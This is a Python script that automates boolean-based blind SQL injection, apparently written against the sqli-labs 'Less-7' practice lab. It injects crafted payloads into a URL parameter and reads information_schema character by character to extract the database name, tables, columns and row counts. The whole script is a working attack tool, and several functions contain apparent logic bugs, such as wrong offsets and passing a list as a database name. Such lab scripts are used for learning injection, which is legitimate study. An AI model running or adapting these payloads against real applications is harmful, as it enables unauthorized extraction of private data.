import requests

data_list_name = []
table_list = []
column_list_num = []
column_list_name = []


def ascii_table():
    str_list = []
    for i in range(32, 128):
        str_list.append(chr(i))
    return str_list


def db_name(url, str):
    print('[-]开始测试数据库名的长度......................')
    num = 1
    while True:
        length_payload = url + "')) and length(database())=%d--+" % num
        g = requests.get(length_payload)
        if str in g.text:
            print("[+]数据库名长度是%d" % num)
            break
        else:
            num += 1
    print('[-]开始测试数据库的名称')
    data_name = ''
    str_list = ascii_table()
    for i in range(1, num + 1):
        for j in str_list:
            db_name_payload = url + "')) and (ord(mid(database(),%d,1))='%s')--+" % (
                i, ord(j))
            g = requests.get(db_name_payload)
            if str in g.text:
                data_name += j
                print(data_name)
                data_list_name.append(data_name)
                break
    print("[+]数据库名称:\n->%s" % data_name)
    return data_name


def table_name(url, str):
    print("[-]开始测试表名...............")
    for k in range(10):
        table_name = ''
        str_list = ascii_table()
        table_length = 0
        for o in range(1, 20):
            table_length_payload = url + "')) and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+" % (
                k, o)
            g = requests.get(table_length_payload)
            if str in g.text:
                table_length = o
                print("第%d张表名长度:%s" % (k + 1, table_length))
                for i in range(0, table_length + 1):
                    for l in str_list:
                        table_payload = url + "')) and (select ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)))=%d--+" % (
                            k, i, ord(l))
                        g = requests.get(table_payload)
                        if str in g.text:
                            table_name += l
                print("[+]:%s" % table_name)
                table_list.append(table_name)
                break
    print("[+]表名名称:\n->%s" % table_list)
    return table_list


def column_list(url, str, name):
    print("[-]开始测试字段的字段数量.......")
    for i in name:
        for l in range(30):
            column_list_num_payload = url + "')) and %d=(select count(column_name) from information_schema.columns where table_name='%s')--+" % (
                l, i)
            g = requests.get(column_list_num_payload)
            if str in g.text:
                column_list = l
                column_list_num.append(column_list)
                print("[+]%s表\t%s个字段" % (i, column_list))
                break
    print("\n[+]表对应的字段数: %s\n" % column_list_num)


def column_name(url, str, name, num):
    column_length = []
    str_list = ascii_table()
    for m in range(len(name)):
        print("\n[+]%s表的字段：" % name[m])
        for i in range(num[m]):
            column_name = ''
            for l in range(1, 21):
                column_name_payload = url + "')) and %d=(select length(column_name) from information_schema.columns where table_name='%s' limit %d,1)--+" % (
                    l, name[m], l)
                g = requests.get(column_name_payload)
                if str in g.text:
                    column_length.append(l)
                    break
                for k in str_list:
                    column_payload = url + "')) and ord(mid((select column_name from information_schema.columns where table_name='%s' limit %d,1),%d,1))=%d--+" % (
                        name[m], i, l, ord(k))
                    g = requests.get(column_payload)
                    if str in g.text:
                        column_name += k
                        column_list_name.append(column_name)
            print("[+]:%s" % column_name)


def content(url, str, dat_name):
    tb_name = input('请输入要查看的表的名字:\n->')
    cl_name = input('请输入要查看%s表的字段名:\n' % tb_name)
    print("[-]开始测试%s表%s字段的内容.........." % (tb_name, cl_name))
    str_list = ascii_table()
    data_num_list = []
    print("开始测试%s表的%s字段" % (tb_name, cl_name))
    for j in range(100):
        data_num_payload = url + "')) and (select count(%s) from %s.%s)=%d--+" % (
            cl_name, dat_name, tb_name, j)
        g = requests.get(data_num_payload)
        if str in g.text:
            data_num = j
            data_num_list.append(data_num)
            break
    print("\n%s表中的%s字段有一下%s条数据：" % (tb_name, cl_name, data_num_list))


def main():
    url = "http://172.17.0.2/Less-7/?id=1"
    str = "You are in.... Use outfile......"
    db_name(url, str)
    table_name(url, str)
    column_list(url, str, table_list)
    column_name(url, str, table_list, column_list_num)
    content(url, str, data_list_name)


if __name__ == "__main__":
    main()
